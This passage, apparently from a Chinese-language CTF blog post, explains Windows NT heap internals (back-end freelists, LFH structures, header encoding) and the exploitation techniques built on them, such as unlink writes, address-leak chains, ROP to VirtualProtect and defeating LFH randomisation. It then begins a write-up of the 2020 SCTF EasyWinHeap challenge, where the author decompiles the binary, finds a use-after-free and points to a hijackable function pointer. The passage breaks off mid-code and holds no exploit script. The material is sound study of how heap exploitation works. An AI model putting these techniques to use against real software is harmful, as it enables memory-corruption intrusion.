class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>ExtendedLookup</code>指向下一个ExtendedLookup，通常下一个会管理更大块chunk</p><p><code>ArraySize</code>该结构管理的最大chunk的大小，通常为0x80（实际上是0x800）</p><p><code>ItemCount</code>目前该结构所管理的chunk数</p><p><code>OutofRangeItems</code>是超出该结构所管理大小的chunk数量</p><p><code>BaseIndex</code>该结构所管理chunk的起始index</p><p><code>ListHead</code>指向FreeList的Head</p><p><code>ListsInUseUlong</code>用来判断ListHint中是否有合适大小的chunk，是一个bitmap</p><p><code>ListHint</code>用来指向相对应大小的chunk array，大小为0x10为一个间隔</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519074.png" alt="image-20250508162938606" style="zoom:50%;" /><h4 id="分配机制"><a href="#分配机制" class="headerlink" title="分配机制"></a>分配机制</h4><p>基本上分为三种：</p><ul><li>Size&lt;&#x3D;0x4000</li><li>0x4000 &lt; size &lt;&#x3D;0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size"><a href="#Size" class="headerlink" title="Size &lt;&#x3D; 0x4000"></a>Size &lt;&#x3D; 0x4000</h5><ul><li><p>首先会看该Size对应的<code>FrontEndHeapStatusBitmap</code>是否启用了LFH</p><ul><li>没有的话，会对对应的<code>FrontEndHeapUsageData</code>加上0x21</li><li>并且检查值是否超过<code>0xff00</code>或<code>&amp;0x1f</code>后超过0x10，如果通过这个条件就会启用LFH</li></ul></li><li><p>接下来会看对应的<code>ListHint</code>是否有值，会以<code>ListHint</code>中的<code>chunk</code>为优先</p></li><li><p>如果有值，就会看该chunk的<code>Flink</code>大小是否刚好也是同样的Size</p><ul><li><p>如果是的话，就会将该ListHint填上Flink的值（1）</p></li><li><p>不是则清空ListHint（2）</p></li><li><p>最后则<code>unlink</code>该chunk，把这块chunk从<code>linked list</code>中移除，返回给使用者，并将header异或回去</p></li></ul></li><li><p>如果没有刚好适合的</p><ul><li>从比较大的<code>ListHint</code>中找，有找到就执行（1）（2）</li><li>然后将该chunk进行<strong>切割</strong>，剩下大小重新加入Freelist，如果可以放进ListHint就会放进去</li><li>最后回传切割好的chunk给使用者，并将header异或回去</li></ul></li><li><p>如果Freelist中都没有</p><ul><li>尝试<code>ExtendHeap</code>加大Heap空间</li><li>再从<code>extend</code>出来的chunk拿</li><li>接着后面一样切割，放回<code>ListHint</code>，还原Header</li></ul></li></ul><h5 id="0x4000-size"><a href="#0x4000-size" class="headerlink" title="0x4000 &lt; size &lt;&#x3D;0xff000"></a>0x4000 &lt; size &lt;&#x3D;0xff000</h5><ul><li>除了没有对LFH相关操作外，其余都跟0x4000一样</li></ul><h5 id="Size-0xff000"><a href="#Size-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>直接使用<code>ZwAllocateVirtualThreshold</code></li><li>类似mmap直接给一大块，并且会插入<code>_HEAP-&gt;VirtualAllocdBlocks</code>这个<code>linked list</code>中<ul><li>这个linked list是串接该<code>Heap VirtualAllocate</code>出来的区段用的</li></ul></li></ul><h4 id="Free机制"><a href="#Free机制" class="headerlink" title="Free机制"></a>Free机制</h4><p>可分为两种：</p><ul><li>Size &lt;&#x3D; 0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size-1"><a href="#Size-1" class="headerlink" title="Size &lt;&#x3D; 0xff000"></a>Size &lt;&#x3D; 0xff000</h5><ul><li><p>会先<strong>检查</strong>alignment，利用unused byte判断该chunk状态</p><ul><li>如果是LFH下，对应的FrontEndHeapUsageData减1</li><li>接着会判断前后的chunk是否为freed，是的话合并<ul><li>此时会把可以合并的chunk做unlink，并将ListHint移除</li><li>移除方式与前面相同，看看下一块是不是同样大小，使得话补上ListHint</li></ul></li></ul></li><li><p>合并完，update size和prevsize，然后会看看是不是在FreeList的最前或最后，是的话就插入FreeList，不是就从ListHint中插入，并且update ListHint，插入时也会对<code>linked list</code>做<strong>检查</strong></p><ul><li>但是这个检查不会abort，其原因是如果检查失败是不会做unlink写入的</li></ul></li></ul><h5 id="Size-0xff000-1"><a href="#Size-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>检查该chunk的linked list，并从<code>_HEAP-&gt;VirtualAllocdBlocks</code>移除</li><li>接着使用<code>RtlpSecaMemFreeVirtualMemory</code>将chunk整个munmap掉</li></ul><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><h4 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h4><p>基本上与Linux中的unlink很类似，绕过方法差不多，简而言之是利用从linked list移除node的行为来做有限制的写入</p><p>要注意的是在会decode的地方，都要让他正常decode，也就是check sum要通过</p><p>另外一点是<strong>Flink及Blink</strong>并不是指向chunk开头，而是<strong>直接指向User data部分</strong>，也就是不太需要做偏移伪造chunk，所以找到一个指向该userdata的pointer让他绕过double linked list的验证就好了</p><p>一般来说Unlink完之后就有任意地址读写了，基本getshell的方法都是通过ROP，那么就要泄露地址</p><ul><li>代码地址<ul><li><code>PEB --&gt; text</code></li></ul></li><li>共享库地址<ul><li><code>text --&gt; IAT --&gt; xxx.dll --&gt; xxx.dll</code></li><li><code>_HEAP-&gt;LockVariable.Lock --&gt; ntdll.dll</code></li><li><code>CrticalSection-&gt;DebugInfo --&gt; ntdll.dll</code></li></ul></li><li>栈地址<ul><li><code>Kernel32.dll --&gt; kernelbase.dll --&gt; KERNELBASE!BasepFilterInfo --&gt; stack address</code></li><li><code>kernel32.dll --&gt; ntdll.dll --&gt; ntdll!PebLdr --&gt; PEB --&gt; TEB --&gt; stack address</code></li></ul></li></ul><p>要么纯ROP到getshell，要么ROP to VirtualProtect&#x2F;VirtualAlloc，然后Jmp to shellcode</p><h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front-End"></a>Front-End</h3><ul><li>在非Debug下才会enable</li><li>Size &lt; 0x4000</li></ul><h4 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h4><h5 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _LFH_HEAP</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +<span class="number">0x000</span> Lock             : _RTL_SRWLOCK</span><br><span class="line">   +<span class="number">0x008</span> SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +<span class="number">0x038</span> SegmentCreate    : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> SegmentDelete    : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> MinimumCacheDepth : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> CacheShiftThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> SizeInCache      : Uint8B</span><br><span class="line">   +<span class="number">0x050</span> RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +<span class="number">0x060</span> UserBlockCache   : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +<span class="number">0x2a0</span> MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +<span class="number">0x2a4</span> Buckets          : [<span class="number">129</span>] _HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x4a8</span> SegmentInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x8b0</span> AffinitizedInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0xcb8</span> SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0xcc0</span> LocalData        : [<span class="number">1</span>] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><p><code>Heap</code>指向对应的<code>_HEAP</code></p><p><code>Buckets</code>用来寻找配置大小对应到Block的阵列结构</p><p><code>SegmentInfoArrays</code>不同大小对应到不同的Segment_info结构，主要管理对应的Subsegment</p><p><code>LocalData</code>其中有个成员是指向LFH本身，用来找回LFH</p><h5 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x000</span> BlockUnits       : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x003</span> UseAffinity      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> DebugFlags       : Pos <span class="number">1</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x003</span> Flags            : UChar</span><br></pre></td></tr></table></figure><p><code>BlockUnits</code>要分配出去的一个block大小&gt;&gt;4</p><p><code>SizeIndex</code>使用者需要的大小&gt;&gt;4</p><h5 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x000</span> LocalData        : Ptr64 _HEAP_LOCAL_DATA</span><br><span class="line">   +<span class="number">0x008</span> ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x010</span> CachedItems      : [<span class="number">16</span>] Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x090</span> SListHeader      : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x0a0</span> Counters         : _HEAP_BUCKET_COUNTERS</span><br><span class="line">   +<span class="number">0x0a8</span> LastOpSequence   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> BucketIndex      : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> LastUsed         : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> NoThrashCount    : Uint2B</span><br></pre></td></tr></table></figure><p><code>LocalData</code>对应到<code>_LFH_HEAP-&gt;LocalData</code> 方便从Segmentinfo找回<code>_LFH_HEAP</code></p><p><code>BucketIndex</code>是这个数组对应的BucketIndex，也就是<code>_LFH_HEAP-&gt;SegmentInfoArrays</code>数组中对应的下标</p><p><code>ActiveSubsegment</code>一个<code>_HEAP_SUBSEGMENT</code>结构体，对应到分配出去的Subsegment，记录了剩余多少chunk，该Userblock最大分配数等等</p><p><code>CachedItems</code>一个<code>_HEAP_SUBSEGEMENT</code>结构体数组，存放对应到该SegmentInfo且还有可以分配chunk给user的Subsegment，当ActiveSubsegment用完之后就会从这里填充置换掉</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519075.png" alt="image-20250509160224918" style="zoom:50%;" /><h5 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> LocalInfo        : Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x008</span> UserBlocks       : Ptr64 _HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x010</span> DelayFreeList    : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x020</span> AggregateExchg   : _INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x024</span> BlockSize        : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> Flags            : Uint2B</span><br><span class="line">   +<span class="number">0x028</span> BlockCount       : Uint2B</span><br><span class="line">   +<span class="number">0x02a</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x02b</span> AffinityIndex    : UChar</span><br><span class="line">   +<span class="number">0x024</span> Alignment        : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Lock             : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>LocalInfo</code>指回对应的<code>_HEAP_LOCAL_SEGMENT_INFO</code></p><p><code>UserBlocks</code>一个<code>_HEAP_USERDATA_HEADER</code>结构体，LFH的分配池，也就是要分配出去的Chunk所在的位置</p><p><code>AggregateExchg</code>用来管理对应的UserBlock中还有多少的freed chunk可以分配</p><p><code>BlockCount</code>在该UserBlock中每个Block（chunk）的大小</p><p><code>BlockCount</code>在该UserBlock中Block的总数</p><p><code>SizeIndex</code>该UserBlock对应到的SizeIndex，也就是<code>CachedItems</code>数组的下标</p><h5 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x000</span> Depth            : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Hint             : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> Lock             : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> Hint16           : Uint2B</span><br><span class="line">   +<span class="number">0x000</span> Exchg            : Int4B</span><br></pre></td></tr></table></figure><p><code>Depth</code>该UserBlock中所剩下的Freed chunk数量</p><p><code>Lock</code>就是锁</p><h5 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x000</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> SubSegment       : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x008</span> Reserved         : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> SizeIndexAndPadding : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x011</span> GuardPagePresent : UChar</span><br><span class="line">   +<span class="number">0x012</span> PaddingBytes     : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> EncodedOffsets   : _HEAP_USERDATA_OFFSETS</span><br><span class="line">   +<span class="number">0x020</span> BusyBitmap       : _RTL_BITMAP_EX</span><br><span class="line">   +<span class="number">0x030</span> BitmapData       : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><p><code>SubSegment</code>指回这个结构体所在的<code>SubSegment</code></p><p><code>EncodeOffsets</code>用来验证该chunkheader是否被修改过</p><p><code>BusyBitmap</code>记录该UserBlock哪些chunk有在用的bitmap</p><h5 id="HEAP-ENTRY-chunk-1"><a href="#HEAP-ENTRY-chunk-1" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SubSegmentCode</code>是Encode过的metadata用来推回userblock的位置</p><p><code>PreviousSize</code>是该chunk在UserBlock中的index</p><p><code>Unusedbyte</code>来判断该LFH chunk状态</p><ul><li><code>Freed</code>, 恒为<code>0x80</code></li><li><code>Inused</code>, <code>UnusedBytes &amp; 0x80 != 0</code></li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519076.png" alt="image-20250509161925186" style="zoom:50%;" /><h5 id="remark"><a href="#remark" class="headerlink" title="remark"></a>remark</h5><p>EncodedOffsets在UserBlock初始化时设置，其值是以下四个值的xor</p><ul><li><code>(sizeof(userblock header)|(BlockUnit*0x10&lt;&lt;16))</code></li><li><code>LFHkey</code></li><li><code>UserBlock address</code></li><li><code>_LFH_HEAP address</code></li></ul><p>所有的chunk header在初始化时都会经过xor，为下面四个值的xor</p><ul><li><code>_HEAP address</code></li><li><code>LFHkey</code></li><li><code>Chunk address &gt;&gt; 4</code></li><li><code>((chunk address) - (UserBlock address)) &lt;&lt; 12</code></li></ul><h4 id="分配机制-1"><a href="#分配机制-1" class="headerlink" title="分配机制"></a>分配机制</h4><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><ul><li>在<code>FrintEndHeapUsageData[x] &amp; 0x1f &gt; 0x10</code>时，下一次<code>allocate</code>会对<code>LFH</code>做出初始化<ul><li>会先<code>ExtendFrontEndUsageData</code>及增加更大的<code>BlocksIndex</code>  (0x80-0x400)</li><li>建立<code>FrontEndHeap</code></li><li>初始化<code>SegmentInfoArrays[idx]</code></li></ul></li><li>接下来在allocate相同大小的chunk就会开始使用LFH</li></ul><p>在第17次的malloc同一个size的时候，此时对应的<code>FrontEndHeapUsageData[x]=0x231 &amp; 0x1f &gt; 0x10</code>，然后<code>heap-&gt;CompatibilityFlag |= 0x20000000</code>，设置上这个flag后，下次allocate就会去初始化LFH</p><p>malloc同一个size第18次时</p><ul><li><code>ExtendFrontEndUsageData</code>及增加更大的<code>BlocksIndex</code>（0x80-0x400），并设置对应的<code>bitmap</code><ul><li>并在对应的<code>FrontEndHeapUsageData</code>写上对应的index，此时可<code>enable LFH</code>范围变为（idx：0-0x400）</li></ul></li><li>建立并初始化 <code>FrontEndHeap</code>（mmap）</li><li>初始化<code>SegmentInfoArrays[idx]</code><ul><li>在<code>SegmentInfoArrays[BucketIndex]</code> 填上<code>segmentInfo</code></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519077.png" alt="image-20250509195843208"></p><p>malloc同一个size第19次时</p><ul><li>Allocate Userblock 并初始化<ul><li>设置对应的chunk</li></ul></li><li>设置对应的ActiviteSubsegment</li><li>随机返回其中的一个chunk</li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519078.png" alt="image-20250509200159429"></p><h5 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h5><ul><li>先看看<code>ActiveSubsegment</code>中是否有可分配的chunk<ul><li>从<code>ActiveSubsegment-&gt;depth</code>判断</li></ul></li><li>如果没有则会从<code>CachedItem</code>找，有找到的话会把<code>ActiveSubsegment</code>换成<code>CachedItem</code>中的<code>subsegment</code></li><li>取得<code>RtlpLowFragHeapRandomData[x]</code>上的值，下一次会从<code>RtlpLowFragHeapRandomData[x+1]</code>取，当下一次轮回时<code>x=rand()%256</code>开始取，x是一个byte的，范围在<code>0x00-0x7f</code></li><li>最后的index为<code>RtlpLowFragHeapRandomData[x]*maxidx&gt;&gt;7</code>，如果冲突则往后取最近的</li><li>检查<code>(unused byte &amp; 0x3f) != 0</code>表示chunk是freed</li><li>最后设置index及unsed byte就返回给用户了</li></ul><h5 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h5><ul><li>用chunk header寻找UserBlock，然后找回对应的SubSegment，设置<code>unused byte=0x80</code>，清除对应的bitmap，<code>update AggregateExchg</code></li><li>ActiveSubsegment并不等于就是free掉chunk的subsegment</li></ul><h4 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h4><p>假设我们拥有Use after free的漏洞，但是因为LFH的随机性，我们无法预测下一块chunk在哪里，使得我们难以利用</p><p>这时我们可以通过填满Userblock的方式，在free掉其中一块，那么下一次该chunk必定会拿到同一块，我们可以利用这个特性，拿到overlap chunk并进一步利用</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2020SCTF-EasyWinHeap"><a href="#2020SCTF-EasyWinHeap" class="headerlink" title="2020SCTF_EasyWinHeap"></a>2020SCTF_EasyWinHeap</h3><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    heapIndex = <span class="number">0</span>;</span><br><span class="line">    heapEntry = &amp;MyHeapEntry_0[<span class="number">1</span>].content;  <span class="comment">// 跳过12个字节</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br><span class="line">printString(<span class="string">&quot;size &gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)allocSizeBuffer);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)allocSizeBuffer &gt; <span class="number">0x90</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sizeRoundedUp = (*(_DWORD *)allocSizeBuffer &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">    allocatedBlock = HeapAlloc(hHeap, <span class="number">1u</span>, sizeRoundedUp);<span class="comment">// 分配的chunk的size会&gt;&gt;4</span></span><br><span class="line">    heapBase = MyHeapEntry_0;</span><br><span class="line">    MyHeapEntry_0[heapIndex].func_ptr = (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">puts</span> | sizeRoundedUp);</span><br><span class="line">    heapBase[heapIndex].content = allocatedBlock;</span><br></pre></td></tr></table></figure><p>省略部分有一个堆条目的查找，可能是因为编译器优化的原因，导致十分复杂，但大致逻辑是一次检查多个条目，根据第一个寻找到的空位置来调整索引值</p><p>看到这个分配逻辑，有个<code>func_ptr</code>感觉或许有点用，其中要注意的是 我们输入的Size会&gt;&gt;4)+1然后与puts进行或的操作，对比下述的show操作，可以知道这个func_ptr的低位是size位，但是问题在于此时HeapAlloc的size是<strong>处理过的size</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)deleteIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)deleteIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  HeapFree(hHeap, <span class="number">1u</span>, MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>这个delete的逻辑，显然是一个UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)showIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)showIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  ((<span class="type">void</span> (__cdecl *)(<span class="type">void</span> *))((<span class="type">int</span>)MyHeapEntry_0[*(_DWORD *)showIndexBuffer].func_ptr &amp; <span class="number">0xFFFFFFF0</span>))(MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>这个show是通过直接调用这个上面提到的<code>func_ptr</code>的，那么如果能hijack这个结构体，就能做到一个getcmd的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">   printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)editIndexBuffer);</span><br><span class="line">   getchar();</span><br><span class="line">   <span class="keyword">if</span> ( *(_DWORD *)editIndexBuffer &gt;= <span class="number">0x10</span>u )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   entryOffset = *(_DWORD *)editIndexBuffer;</span><br><span class="line">   <span class="keyword">if</span> ( !MyHeapEntry_0[*(_DWORD *)editIndexBuffer].heap_addr )</span><br><span class="line">     <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">   printString(<span class="string">&quot;content  &gt;&quot;</span>);</span><br><span class="line">   contentIndex = <span class="number">0</span>;</span><br><span 